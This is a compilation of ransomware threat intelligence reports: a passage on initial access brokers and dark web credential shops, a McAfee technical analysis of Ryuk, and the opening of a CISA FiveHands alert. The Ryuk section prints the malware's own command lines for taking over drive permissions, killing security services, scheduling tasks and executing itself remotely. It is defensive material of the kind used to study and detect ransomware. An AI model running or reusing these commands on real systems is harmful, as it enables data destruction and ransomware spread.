\nprice (“start”), the minimum price of bid hikes (“step”), and the \nfull or “buy now” price if a threat actor is interested in purchasing \nimmediately (“blitz”). This is often followed by a time range in \nwhich the posting will close, which is generally between 4 and 8 \nhours. The IAB will often indicate if a sale is made in the thread \n(“sold”, продано), asking the forum’s moderation staff to then \nclose the thread for new replies. IABs, especially those who \nare working with unknown or low-reputation threat actors on \nthe forums, will often request the use of escrow or middleman \nservices to facilitate transactions. \n\nBelow are 3 examples of advertisements from high-credibility \nIABs“ :inthematrix1“ ,”nei ,”and“ zirochka:”\n\nFigure 2: Examples of IAB services on the top-tier Russian-language forum Exploit (Source: Exploit)\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nwww.recordedfuture.com | Recorded Future®  CTA-2022-0802 4\n\nDark Web Shops and Marketplaces\n\nDark web shops and marketplaces are common sources for \nthreat actors to obtain compromised valid credentials, browser \nand session cookies, RDP and VPN keys, and more. Dark web \nshops are typically a low-cost method for threat actors to \npurchase infostealer logs or bots which affect specific domains, \nIP address ranges, entities, or internet service providers (ISPs). \nHowever, one of the drawbacks of dark web shops is that it is \ndifficult to obtain credentials with administrator-level privileges \nin a single purchase. Threat actors often have to purchase \ncompromised credentials in bulk, expending much more money, \ntime, and energy than working directly with an IAB. Regardless, \ndark web shops and marketplaces remain a common method \nby which IABs or ransomware affiliates gain initial access to \nan entity’s network. It is also a common method by which IABs \ncan turn a profit on dark web and special-access forums, via \n“flipping” low-cost credentials, often purchased for less than \n$10, to ransomware affiliates for potentially thousands of dollars. \nThe most prevalent dark web shops are Russian Market, Genesis \nStore, and 2easy Shop.\n\nRussian Market\n\nRussian Market is a criminal shop operated by the threat \nactor “RussianMarket” that sells database dumps, RDP and \nSSH accesses, infostealer logs, compromised payment cards, \nand PayPal accounts. Infostealer logs are primarily harvested \nfrom victims infected with popular infostealers, such as Vidar, \nAZORult, Raccoon Stealer, RedLine, or Taurus. Russian Market \nis one of the most prevalent dark web shops, offering millions \nof infostealer logs affecting entities around the world. It is a \ncommon destination for threat actors seeking to purchase \ncompromised information related to specific entities, domains, \nor subdomains, which can then be used for initial access, lateral \nmovement, and privilege escalation.\n\nGenesis Store\n\nGenesis Store is a criminal shop likely created by the threat \nactor “GenesisStore” in 2018. The store is advertised across \nmultiple Russian- and English-language dark web forums. \nGenesis Store sells packages (“bots”) of compromised account \ncredentials and associated user data designed to allow threat \nactors to bypass anti-fraud solutions.\n\nFigure 3: Sample of listings on the dark web shop Russian Market (Source: Russian Market)\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nRecorded Future® | www.recordedfuture.com CTA-2022-08025\n\nUsing Access/Credentials to Deploy Ransomware\n\nCase Study: BlackMatter Ransomware\n\nFigure 5 below shows “BlackMatter”, a user representing the \nBlackMatter ransomware affiliate program, looking for targets \nlocated in specific countries, excluding medical and government \nentities, with revenues at a certain profit threshold. This gives \ninsight into the way that ransomware groups get access to \nnetworks and how they recruit affiliates, and it suggests that \nfinancial gain is a primary motivator.\n\nFIgure 5: BlackMatter representative advertisement looking for target networks (Source: Exploit)\n\nVictim data is sold in a single package referred to as a bot \nor log, which includes account credentials, IP address, browser \nfingerprint (system information), and cookies. After a bot is \npurchased by a threat actor, victim data can be imported into \na browser plugin called Genesis Security, as shown in Figure \n4 below. This feature allows the attacker to masquerade as \nthe victim and perform account takeover and session hijacking \nattacks. The price for each bot varies depending on the number \nof account credentials, types of accounts, and geographical \nlocation of the victim.\n\n2easy Shop\n\n2easy Shop is a Russian and English-language dark web shop \nthat has been in operation since at least 2021 and was founded \nby the threat actor “2easy”. The shop sells logs harvested from \nunspecified infostealers, but likely Vidar, RedLine, and Raccoon \nStealer, among others. The prices for logs range between $3 \nand $200 per listing and include compromised user logs and \naccounts from hundreds of organizations around the world. The \nprice point for victim data on the shop varies depending on the \ncontent and date of the listing.\n\nWhen compromised data is purchased on 2easy Shop, \na buyer typically receives a victim’s browser cookie data, \nbrowser history, screenshots, general system information about \ncompromised machines, and other data. The compromised \naccount credentials and associated user data is commonly used \nby threat actors to bypass targeted organizations’ defenses and \nanti-fraud solutions, which can be used for initial access, lateral \nmovement, or privilege escalation.\n\nFigure 4: Import cookies with the Chrome browser plugin “Genesis Security” (Source: Genesis Store)\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nwww.recordedfuture.com | Recorded Future®  CTA-2022-0802 6\n\nOnce access to a compromised network or domain is obtained, \nthreat actors then leverage several tools and TTPs to move \nlaterally in a system, escalate privileges, exfiltrate or destroy \ndata, and deploy ransomware. According to the FBI, affiliates \nassociated with the BlackMatter ransomware-as-a-service \n(RaaS) group have used previously compromised user credentials \nas an initial access vector to compromise organizations. After \ngaining access, threat actors compromise Active Directory to \ngain additional user and administrator privileges, then modify \nGroup Policy Objects (GPOs) to deploy ransomware.\n\nCase Study: Conti Ransomware\n\nLike the threat actors associated with BlackMatter, Conti \nGang, the operators of Conti Ransomware, and their affiliates also \ntypically begin compromising a network using stolen credentials. \nAccording to CISA, Conti affiliates use a variety of initial access \nvectors including phishing, compromised credentials, malware \ndistribution, and exploiting vulnerabilities. CISA and the FBI \nhave observed Conti’s operators using Router Scan, a tool to \nscan and brute-force network devices. The attackers would \nalso use kerberoasting to discover and crack administrator \nhashes. Once they successfully achieve Domain Administrator \nrights, they begin exfiltrating sensitive data using Rclone and \nmega[.]nz. When the threat actors are satisfied with the data \nthey captured and the network defenses have been removed, \nthey begin preparing the network to deploy the ransomware. \nAs we saw with the BlackMatter case study, Conti will place the \nransomware executable in a location such as SYSVOL on the \nDomain Controller and then set up a domain-wide scheduled \ntask to execute the ransomware under the highest privileges \nachieved.\n\nMitigations\n\nCredential Leaks \n\nCredential leaks and email exposure amplify the risks \nassociated with ransomware attacks, as the data can be used \nto devise tailored spearphishing lures and serve as initial points \nof compromise via credential stuffing and account takeover. \nRecorded Future clients can surface exposed credentials in the \nRecorded Future Platform and should force password resets for \nthose users whose leaked credentials are still active. \n\nInfostealer Malware\n\nGiven the role that infostealers play in underground \nmarketplaces and in enabling ransomware attacks, mitigation \nstrategies against infostealer malware should be incorporated:\n\n•\t Keep all systems current with the latest security patches \nand updates.\n\n•\t Invest in a solution that offers patch posture reporting. \nThis type of solution can provide insight into the \nvulnerabilities that have received remediation measures \nas well as the machines that have received those \npatches. \n\n•\t Install an antivirus solution, schedule signature updates, \nand monitor the antivirus status on all equipment.\n\n•\t Configure intrusion detection systems (IDS), intrusion \nprevention systems (IPS), or any network defense \nmechanisms in place to alert on any malicious activity.\n\n•\t Deploy a spam filter used to detect indicators of \nphishing, such as viruses, blank senders, and keyword \ntext triggers.\n\n•\t Deploy a web filter to block malicious websites.\n\n•\t Monitor for suspicious changes to system file drives and \nRegistry that focus on the interception of keystrokes.\n\n•\t Educate your employees and conduct training sessions \nwith mock phishing scenarios.\n\n•\t Develop a password security policy that includes but is \nnot limited to password expiration and complexity.\n\n•\t Require encryption for employees, especially employees \nworking remotely. This includes whole-disc, such as 256-\nbit AES, and network encryption via SSL or TLS.\n\n•\t For enterprises, Recorded Future can monitor for \npotential typosquat domains weaponized in phishing \nattacks. This includes not only the domains belonging to \none organization, but third-party partners and vendors \nwith enterprise network access.\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\nhttps://www.ic3.gov/Media/News/2022/220420.pdf\nhttps://www.cisa.gov/uscert/sites/default/files/publications/AA21-265A-Conti_Ransomware_TLP_WHITE.pdf\n\n\nRecorded Future® | www.recordedfuture.com CTA-2022-08027\n\n•\t The Recorded Future Platform can also assist with \nthe detection of compromised credential information \nlinked to valid accounts to assist in providing context \nsurrounding suspicious user behavior that may include \nkeylogging activity. Recorded Future Platform users can \ncontinue to monitor underground sources to identify the \nspyware and keylogging tools that are likely to be the \nmost harmful to their immediate infrastructure or supply \nchain.\n\nRansomware\n\nMaintain offline backups of your organization’s data and \nensure that these backups stay up to date to prevent data loss \nin the event of a ransomware infection. Additionally, Recorded \nFuture recommends the following mitigations to reduce overall \nrisk:\n\n•\t Ransomware often follows a specific pattern of behavior \nthat can be detected with a robust threat intelligence \nsystem, integrated with SIEM platforms. \n\n•\t Implement YARA rules like the ones found in \nRecorded Future Hunting Packages to identify \nmalware via signature-based detection or SNORT \nrules for endpoint-based detections.\n\n•\t The IOCs provided throughout this report can be \nused to proactively query or scan environments \nfor items such as file hashes, registry keys, and IP \ntraffic associated with ransomware.\n\n•\t Network segmentation can halt the propagation of \nransomware through an organization’s network. This \nsolution involves splitting the larger network into \nsmaller network segments and can be accomplished \nthrough firewalls, virtual local area networks, and other \nseparation techniques. \n\n•\t If remote access solutions are crucial to daily operations, \nall remote access services and protocols, such as Citrix \nand RDP, should be implemented with two-factor or \nmulti-factor authentication. \n\n•\t Exposed Remote Desktop Protocol (RDP) servers \nare also abused by threat actors to gain initial \naccess into a target’s network. Threat actors will \nlook for networks that have internet-facing servers \nrunning RDP and then exploit vulnerabilities \nin those servers or use brute-force password \nattacks. Once inside the network, the threat actors \nmove laterally and install ransomware on target \nmachines, often disabling backups and other \nprotections.\n\n•\t Through the use of process monitoring, monitor for the \nexecution and command of binaries involved in data \ndestruction activity, such as vssadmin, wbadmin, and \nbcdedit. \n\n•\t Monitor for the creation of suspicious file modification \nactivity, particularly large quantities of file modifications \nin user directories.\n\n•\t Consider keeping sensitive client information on systems \ndisconnected from the internet or segmented from the \nrest of the corporate network. Since ransomware will \nencrypt all files on a victim system and often will search \nfor directories on the network (such as networked file \nshares) to also encrypt, moving highly sensitive customer \ndata to a system with no internet access or access to the \nrest of the network will minimize the access ransomware \nwould have to those files.\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\nhttps://www.recordedfuture.com/leaked-credentials-risk/\n\n\nwww.recordedfuture.com | Recorded Future®  CTA-2022-0802 8\n\nOutlook\nInfostealer malware and exfiltrated logs will remain popular \n\namong threat actors as a means to obtain credentials to gain \naccess to victim networks. While some infostealer variants, \nsuch as RedLine, FickerStealer, and AZORult have endured, new \nvariants like Mars Stealer, MetaStealer, and Eternity will continue \nto emerge. Dark web shops and marketplaces will also remain an \nattractive source of infostealer logs for threat actors. However, \nthe most effective method by which a ransomware affiliate can \ngain initial access to a compromised network is through the use \nof an IAB on dark web and special-access forums. Other attack \nvectors by which initial access is gained is through the use of \na RAT, phishing, spearphishing, and other social engineering \nattacks. The process by which ransomware operators and \naffiliates infect networks following initial access can be very \nquick and often undetectable.\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nRecorded Future® | www.recordedfuture.com CTA-2022-08029\n\nAppendix A :MITRE ATT&CK\n\nRESOURCE DEVELOPMENT\n\nEnterprise T1584 Compromise Infrastructure\n\nEnterprise T1587 Develop Capabilities\n\nINITIAL ACCESS\n\nEnterprise T1566 Phishing\n\nEnterprise T1078 Valid Accounts\n\nEnterprise T1190 Exploit Public-Facing Application\n\nEnterprise T1189 Drive-by Compromise\n\nEXECUTION\n\nEnterprise T1059 Command and Scripting Interpreter\n\nEnterprise T1204 User Execution\n\nPERSISTENCE\n\nEnterprise T1133 External Remote Service\n\nEnterprise T1137 Office Application Startup\n\nPRIVILEGE ESCALATION\n\nEnterprise T1055 Process Injection\n\nDEFENSE EVASION\n\nEnterprise T1027 Obfuscated Files or Information\n\nCREDENTIAL ACCESS\n\nEnterprise T1557 Adversary-in-the-Middle\n\nEnterprise T1110 Brute Force\n\nEnterprise T1555 Credentials From Password Stores\n\nEnterprise T1056 Input Capture\n\nEnterprise T1539 Steal Web Session Cookie\n\nDISCOVERY\n\nEnterprise T1217 Browser Bookmark Discovery\n\nLATERAL MOVEMENT\n\nEnterprise T1021 Remote Services\n\nCOLLECTION\n\nEnterprise T1115 Clipboard Data\n\nEnterprise T1005 Data From Local System\n\nEnterprise T1114 Email Collection\n\nEnterprise T1113 Screen Capture\n\nEnterprise T1125 Video Capture\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nwww.recordedfuture.com | Recorded Future®  CTA-2022-0802 10\n\nCOMMAND AND CONTROL\n\nEnterprise T1071 Application Layer Protocol\n\nEXFILTRATION\n\nEnterprise T1041 Exfiltration Over C2 Channel\n\nIMPACT\n\nEnterprise T1485 Data Destruction\n\nEnterprise T1486 Data Encrypted For Impact\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nCYBER THREAT ANALYSIS\n\nRecorded Future® | www.recordedfuture.com CTA-2022-080211\n\nAbout Recorded Future®\n\nRecorded Future is the world’s largest intelligence company.

Ryuk is used exclusively in targeted \nransomware attacks. \n\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. \nAnalysis of the initial versions of the ransomware by our team revealed similarities and shared \nsource code with the Hermes ransomware. Hermes ransomware is a commodity malware for \nsale on underground forums and has been used by multiple threat actors. \n\nTo encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and \nasymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt \nthe file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon \npayment of the ransom the corresponding asymmetric private key is released, allowing the \nencrypted files to be decrypted. \n\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to \nthe victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised \ncredentials to remote access systems and the use of previous commodity malware infections.  \nAs an example of the latter, the combination of Emotet and TrickBot has been frequently \nobserved distributing Ryuk, though recently BazarLoader has also been seen distributing it.\n\nRyuk Ransomware Now Targeting \nWebservers\n\nRyuk Ransomware Now Targeting Webservers3\n\nREPORT\n\nhttps://www.mcafee.com/blogs/\nhttps://twitter.com/mcafee_business\nhttps://www.linkedin.com/company/mcafee/\nhttp://www.facebook.com/mcafee\nhttp://www.youtube.com/mcafee\nhttp://www.slideshare.net/mcafee\nhttps://www.mcafee.com/enterprise/en-us/forms/threat-information-subscription.html?eid=X7AOM1OW\nhttps://www.mcafee.com/enterprise/en-us/forms/threat-information-subscription.html?eid=X7AOM1OW\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-exploring-the-human-connection\n\n\nThe Ryuk infection chain usually starts with a spear-phishing email with \na malicious URL or an Office document to gain initial entry into victim \nenvironments. In certain cases, compromised RDP computers provide \nthe initial access. In the first scenario, either Trickbot or BazarLoader \nwill be executed and used as a loader malware, offering other actors the \nopportunity to purchase hacked machines. Once access to the victim’s \nmachines is acquired by the ransomware actors, a Cobalt Strike beacon is \noften downloaded in order to obtain users’ credentials and move laterally \non the network to take over the domain controllers. Finally, the Ryuk binary \nis distributed to every machine from the domain controllers.\n\nThe main goal of this blog is to deeply analyze the Ryuk binary itself.\n\nGeneral Overview\n\nThe analyzed file corresponds to an unpacked ransomware sample from \nthe Ryuk family.\n\nThe sample can be identified by the following hashes:\n\nHash type Value\n\nSHA1 1EFC175983A17BD6C562FE7B054045D6DCB341E5\n\nSHA256 8F368B029A3A5517CB133529274834585D087A2D3A \n5875D03EA38E5774019C8A\n\nThe Ryuk final payload has a size of 148Kb and the compilation date is 30 \nApril 2021 and, while this date could have been manipulated, we believe it is \ngenuine.\n\nAnti-debugging Checks\n\nRyuk repeatedly implements anti-disassembly techniques to make analysis \nwith static analysis tools more difficult.\n\nFigure 1. Anti-disassembly trick\n\nLikewise, the malicious code will implement anti-debugging techniques \nby using the API ZwQueryInformationProcess (T1106 - Native API) along \nwith various flags such as ProcessDebugFlags, ProcessDebugPort, and \nProcessDebugObjectHandle (T1497.001 System Checks) which will allow \nthe ransomware to determine if a debugger is present and, if it is, it will \ncrash itself.\n\nFigure 2. Query process\n\nRyuk Ransomware Now Targeting Webservers4\n\nREPORT\n\n\n\nAdditionally, the malware will check the BeingDebugged flag (T1497.001 \nSystem Checks) from the PEB structure of the process with the same \npurpose as stated above. \n\nFigure 3. Check if process is being debugged\n\nExecution\n\nRyuk copies itself three times in the current directory with different names \nand launches these new executables with distinct command lines to \nexecute different functionality in each execution.\n\nFor the first copy of the malware the filename is calculated as a checksum \nof the current username and the suffix “r.exe” is appended. If the malware \ncannot obtain the username, it will use the default filename “rep.exe.” Also, \nwhen the malware executes the file, it uses the “9 REP” command line. \n\nThis process will be responsible for the self-replication to other machines \nin the network.\n\nFigure 4. First execution\n\nThe second copy of the malware has a randomly generated name and the \nsuffix “lan.exe” appended. In this case, the malware passes the command \nline “8 LAN.” This process will be responsible for sending the Wake On Lan \npackets to other computers in the network.\n\nFigure 5. Second execution\n\nThe third copy follows the same name convention as the second and has \nthe same command line.\n\nFigure 6. Execution of third copy\n\nRyuk Ransomware Now Targeting Webservers5\n\nREPORT\n\n\n\nRansom Note\n\nTo notify the user about the encryption, Ryuk drops an HTML ransom note \nin every folder that it encrypts. This note is remarkably similar to the note \nused in other Ryuk variants, with the only difference being the use of a \ncontact button with some instructions to install the Tor Browser.\n\nFigure 7. HTML Ransom note\n\nWhen the contact button is clicked, an alert appears with instructions to \ncontact the ransomware actors.\n\nFigure 8. Browser alert with instructions\n\nIf we follow the instructions and access the Onion link, we can find the \ncontact portal with a form asking for an e-mail, password, the name of the \norganization, and an area in which to write a message to the actors.\n\nFigure 9. Ryuk contact portal\n\nChange Drive Permissions\n\nThe malware will identify the mounted local drives via GetLogicalDrives \nAPI call and for each of them it will change their permissions using the \nWindows tool icacls (T1222.001 – Windows File and Directory Permissions \nModification) to grant full access to the drive. \n\nFigure 10. Icacls execution\n\nBelow is an example of the command that Ryuk will execute:\n\nicacls “C:\\*” /grant Everyone: F /T /C /Q\n\nRyuk Ransomware Now Targeting Webservers6\n\nREPORT\n\n\n\nProcess and Service Termination\n\nBefore starting with the file encryption, the malware will start a new thread \nwhere it will try to finish a list of processes and stop some other services.\n\nFigure 11. Thread creation\n\nIn this new thread, the malware will enumerate the running processes \n(T1057 – Process Discovery) and services (T1489 – Service Stop) \nand check if the name matches with a list of 41 processes (Appendix \nA – Terminated Processes) and 64 services (Appendix B – Terminated \nServices) the malware has hardcoded in the sample. Some of these \nprocesses and services belong to AV products, backup services, and \nothers might be using files which the ransomware targets (T1562.001 – \nDisable or Modify Tools).\n\nFigure 12. Thread functions\n\nTo finish the process execution that the malware targets, it uses the \nfollowing command:\n\n“C:\\Windows\\System32\\taskkill.exe” /IM <ProcessName> /F\n\nTo stop the services that the malware targets, it uses the following \ncommand:\n\n“C:\\Windows\\System32\\net.exe” stop “<ServiceName>” /y\n\nSince the services and processes that the malware targets are \nchecked with the function ‘strstr,’ and this function returns partial \nmatches of the string, the malware will finish untargeted process like \n‘audioendpointbuilder’ because it contains the string ‘endpoint.’\n\nFigure 13. Bogus service stop\n\nRyuk Ransomware Now Targeting Webservers7\n\nREPORT\n\n\n\nFile Encryption\n\nThe malware will try to encrypt both local drives and network drives and \niterate over each file on the drive and check its path and filename (T1083 – \nFile and Directory Discovery).\n\nRyuk does not encrypt files that contain the following names in its full path:\n\n\\Windows\\\n\nWindows\n\nboot\n\nWINDOWS\\\n\nChrome\n\nMozilla\n\nSYSVOL\n\nNTDS\n\nnetlogon\n\nsysvol\n\nThe malware also does not encrypt files if the filename contains any of the \nfollowing strings:\n\nRyukReadMe.html\n\nboot\n\ndll\n\nntldr\n\nexe\n\n.ini\n\n.lnk\n\nbootmgr\n\nboot\n\nNTDETECT\n\nAlso, the malware will verify if the filename contains “index.” and if it is true, \nit will call a function we named “RyukDropRansomNoteInIndexFile.”\n\nFigure 14. Check index files\n\nRyuk Ransomware Now Targeting Webservers8\n\nREPORT\n\n\n\nIf the file name contains “.php” it will dynamically create PHP code to \nrender the HTML ransom note. Otherwise, it will overwrite the file contents \nwith the HTML ransom note code. With this, the malware ensures that \nwhen someone accesses a website the Ryuk ransom note will appear.\n\nFigure 15. Drop RYUK ransom note in index files\n\nIt is believed that this functionality was added to newer versions of the \nmalware to target web servers and deface public websites with the \nRyuk ransom note. This is a tactic never seen before in the ransomware \nlandscape and whose final purpose is to pressure victims to pay.\n\nIn this later version of Ryuk, the encryption scheme is the same as \nprevious versions; it uses random AES 256 keys generated with the API \nCryptGenKey (T1486 – Data Encrypted for Impact) for each file and it \nencrypts those keys with the actor’s RSA public key that is hardcoded in \nthe malware. With this scheme the attackers ensure that the cryptography \nand key management are robust.\n\nFigure 16. AES 256 key generation\n\nRyuk Ransomware Now Targeting Webservers9\n\nREPORT\n\n\n\nBefore encrypting a file, the malware will check if it is already encrypted, \nsearching for the keyword “HERMES” for old Ryuk versions and \n“RYUKTM” for recent versions. If it finds those keywords it will close the \nhandle to file and not encrypt it.\n\nFigure 17. HERMES and RYUKTM check\n\nThen, the malware will start encrypting the file in chunks with a defined size \nof 1,000,000 bytes.\n\nFigure 18. File chunk encryption\n\nAfter that, the malware will write the keyword “RYUKTM” to mark the file as \nencrypted and will export the AES key encrypted with the RSA public key \nusing the API CryptExportKey and write it at the end of the file.\n\nFigure 19. File key exporting\n\nRyuk Ransomware Now Targeting Webservers10\n\nREPORT\n\n\n\nHere is an example of an encrypted file with the 274 bytes of metadata info \nappended at the end of file by Ryuk.\n\nFigure 20. Appended metadata\n\nPrint Task\n\nAfter the encryption of the files, the malware will create a new scheduled \ntask (T1053.005 – Scheduled Task) that will print 50 copies of the RTF \nransom note in the default printer configured in the system. The command \nline to create this task (T1059.003 – Windows Command Shell) is the \nfollowing:\n\nSCHTASKS /CREATE /NP /SC DAILY /TN “PrintvE” /TR “C:\\Windows\\System32\\cmd.\n\nexe /c for /l %x in (1,1,50) do start wordpad.exe /p C:\\users\\Public\\YTKkI.\n\ndll” /ST 10:25 /SD 05/18/2021 /ED 05/25/2021\n\nAt a certain time during the week the task would print 50 pages of an RTF \nransom note containing the password dropped in the Public directory with \na random name and the dll extension (T1036 – Masquerading). \n\nFigure 21. Ryuk RTF note\n\nThis is also a new functionality added to the malware with the intention \nof creating chaos in the victim’s system and pressurizing them to pay the \nransom price to decrypt the files.\n\nRyuk Ransomware Now Targeting Webservers11\n\nREPORT\n\n\n\nWake on Lan\n\nThe Ryuk process with the command line “8 LAN” is responsible for \nobtaining the ARP cache entries of the system and sending the Wake on \nLan packets to try to turn on the remote computers. To extract the ARP \ntable, the malware will use the GetIpNetTable API (T1016 – System Network \nConfiguration Discovery) from the iphlpapi.dll and after retrieving the \npreviously mentioned table, it will begin to send the packets using the API \nsendto from the Winsock library. \n\nFigure 22. Send Wake on Lan packet\n\nThe Wake on Lan magic packets (T1205 – Traffic Signaling) are made up \nof 6 bytes with the 255 value (0xFF in hexadecimal) followed by sixteen \nrepetitions of the target computer MAC address for a total of 102 bytes.\n\nFigure 23. Wake on Lan packet\n\nNetwork Shares Enumeration\n\nRyuk will also try to move laterally to other hosts in the network, first \nobtaining all the IP addresses assigned to the system and checking if \nthey belong to a private IPv4 addressing range (10.x.x.x, 172.16.x.x and \n192.168.x.x). Because the previously mentioned check is done with the \nfunction strstr, it can match with other public subnets such as 151.192.172.1.\n\nFigure 24. Bug checking private IP networks\n\nRyuk Ransomware Now Targeting Webservers12\n\nREPORT\n\n\n\nIf the subnet is one of the above, it will proceed to send ICMP Echo requests \nwith the API IcmpSendEcho to discover new machines in the subnet (T1135 \n– Network Share Discovery). If the machine responds to the ping, it will be \nconsidered a potential victim and Ryuk will try to encrypt its files.\n\nFigure 25. ICMP Echo request\n\nFor each host discovered, Ryuk will attempt to encrypt them using a similar \nmethod to the one used for local drives, by building a UNC path in the \nfollowing format for each driver letter, from A to Z:\n\n\\\\<IP>\\<drive letter>$\n\nAlso, it will try to access and encrypt the following UNC path:\n\n\\\\<IP>\n\nAs can be seen in the following image:\n\nFigure 26. Ryuk UNC file encryption\n\nSMB Replication\n\nThe Ryuk process with the command line “9 REP” will be responsible \nfor replicating itself into new computers but first it will check for double \nexecutions of the same process creating a mutex object with the name of \nthe username of the machine (T1082 – System Information Discovery). If \nthe mutex already exists it will finish the process. \n\nFigure 27. Mutex creation\n\nNext, the malware will check if the file already exists in the remote \ncomputer using the API GetFileAttributesW. The UNC file path will be \nconstructed on the fly, and it will always try to access the path “C:\\Users\\\nPublic” from the remote computer. The filename is created by doing a \nchecksum of the current username and appending the suffix “r.exe”.T1053\n\nFigure 28. Ryuk file copy\n\nThen, it will use the API CopyFileW to copy the file to the remote computer \nand to achieve remote execution it will create a scheduled task with a \nrandom name using the schtasks.exe tool to execute the ransomware copy \n(T1021 – Remote Services).\n\nFigure 29. Remote service creation\n\nRyuk Ransomware Now Targeting Webservers13\n\nREPORT\n\nhttps://attack.mitre.org/techniques/T1053/005\n\n\nTherefore, for each compromised remote machine the following two \ncommands will be executed:\n\nschtasks.exe /Create /S 192.168.56.2 /TN qdpRGwh /TR \\”C:\\\\Users\\\\Pub-\n\nlic\\\\622r.exe\\” /sc once /st 00:00 /RL HIGHEST \n\nschtasks.exe /S 192.168.56.2 /Run /TN qdpRGwh\n\nDefending Against Ryuk with McAfee\n\nRyuk, like other ransomware, leverages multiple techniques to access the \nnetwork and remain persistent before having an impact. In other words, \nattacks using ransomware do not start with encryption and therefore you \nhave multiple opportunities to prevent, disrupt, or detect the malicious \nactivity. Below is an overview of how you can defend against Ryuk with \nMcAfee® MVISION™ Security Architecture.\n\nFigure 30. Ryuk Kill Chain\n\nRyuk Ransomware Now Targeting Webservers14\n\nREPORT\n\n\n\nSome best practices to detect or prevent very early in the attack chain \nwith McAfee® Endpoint Protection and MVISION Unified Cloud Edge can \ninclude:\n\nInitial Access\nEndpoint Firewall and Web Control (ENS): Restrict access to necessary \nports and prevent access to web sites with malicious or unknown \nreputation.\n\nEndpoint Protection Platform (ENS): Configure both Threat Prevention \nand Adaptive Threat Prevention modules for maximum protection \nagainst malware delivered through Spearphishing. In particular, use GTI \nin both modules and ensure JTI Rules 4 (GTI File Reputation) and 5 (URL \nReputation) are enabled. \n\nCommand and Control\nEndpoint Protection Platform (ENS) and MVISION EDR can both identify \nCobalt Strike and other type of command-and-control techniques. \nMVISION EDR provides a unified view of endpoint prevention and detection \nevents so you can speed up triage. \n\nUnified Cloud Edge (UCE – SWG) can prevent access to risky web sites \nusing threat intelligence, URL reputation, behaviour analysis, and remote \nbrowser isolation. Ensure you have a strong web security policy in place \nand are monitoring logs.\n\nMore details on specific rules and other defense recommendations can be \nfound here.\n\nConclusion\n\nIn this short report we have presented a technical overview of the Ryuk \nransomware and the new functionalities added to the malware used to \nincrease the damage on the organizations it targets. \n\nIt is interesting to note that Ryuk has shifted its attention to webservers \nsince it no longer encrypts the index file but replaces it with the ransom \nnote instead. Furthermore, the developers behind Ryuk upgraded the \nmalware with the ability to print the ransom note in the default printer. \nThese new functionalities were included to pressure victims into paying the \nransom.\n\nIn the first half of the year, several Ryuk actors have been known to be \nactively launching new campaigns and targeting organizations all over the \nworld. This is the reason we believe the criminals behind Ryuk will continue \nto develop new features and invent new methods to maximize their profits.\n\nMcAfee Advanced Threat Research is actively monitoring this threat, \ndetected as Ransom-Ryuk![partial-hash], for future releases. Meanwhile, \na solid data loss prevention strategy remains the best advice against \nall forms of ransomware; for general prevention advice please visit \nNoMoreRansom.

See the ATT&CK for Enterprise framework for\nall referenced threat actor tactics and techniques.\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) is aware of a recent successful\ncyberattack against an organization using a new ransomware variant, which CISA refers to\nas FiveHands. Threat actors used publicly available penetration testing and exploitation\ntools, FiveHands ransomware, and SombRAT remote access trojan (RAT), to steal\ninformation, obfuscate files, and demand a ransom from the victim organization. Additionally,\nthe threat actors used publicly available tools for network discovery and credential access.\n\nThis report provides the tactics, techniques, and procedures the threat actors used in this\nattack as well as indicators of compromise (IOCs). It also includes CISA’s recommended\nmitigations to protect networks from ransomware attacks and to detect—and respond to—\nthese attacks.\n\nRefer to Malware Analysis Report AR21-126B for full technical details and associated IOCs.\n\nFor a PDF copy of this report, click here.\n\nNote: the analysis of FiveHands ransomware is ongoing; CISA will update this report as new\ninformation becomes available.\n\nDescription\n\nInitial Access\n\nThe initial access vector was a zero-day vulnerability in a virtual private network (VPN)\nproduct (Exploit Public-Facing Application [T1190]).\n\nPublicly Available Tool: SoftPerfect Network Scanner\n\nThe cyber actor used SoftPerfect Network Scanner for Discovery [TA0007] of hostnames and\nnetwork services (Network Service Scanning [T1046]).\n\nDetails on the SoftPerfect Network Scanner artifacts are below.\n\nnetscan.exe\n\nhttps://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\nhttps://attack.mitre.org/versions/v7/matrices/enterprise/\nhttps://us-cert.cisa.gov/ncas/analysis-reports/ar21-126b\nhttps://us-cert.cisa.gov/sites/default/files/publications/AR21-126A_FiveHands_Ransomware.pdf\nhttps://attack.mitre.org/versions/v9/techniques/T1190/\nhttps://attack.mitre.org/versions/v9/tactics/TA0007/\nhttps://attack.mitre.org/versions/v9/techniques/T1046/\n\n\n2/10\n\nThe netscan.exe  artifact is a stand-alone version of the SoftPerfect Network Scanner,\nversion 7.2.9 for 64-bit operating systems. The SoftPerfect website states that the\n\"SoftPerfect Network Scanner can ping computers, scan ports, discover shared folders, and\nretrieve practically any information about network devices, via Windows Management\nInstrumentation (WMI), Simple Network Management Protocol (SNMP), Hypertext Transfer\nProtocol (HTTP), Secure Shell (SSH), and PowerShell. It also scans for remote services,\nregistry, files and performance counters; offers flexible filtering and display options and\nexports NetScan results to a variety of formats from XML to JSON.\"\n\nThe utility can also be used with Nmap for vulnerability scanning. The utility will generate a\nreport of its findings called netscan.xml .\n\nnetscan.xml\n\nThe netscan.xml artifact is an Extensible Markup Language (XML) document reporting\nscanning results for the SoftPerfect Network Scanner program. The XML document indicates\nthat a random scan was conducted to identify hostnames on a network and to search for:\n\nweb servers, \nfile servers, \ndatabase servers, and\nany open 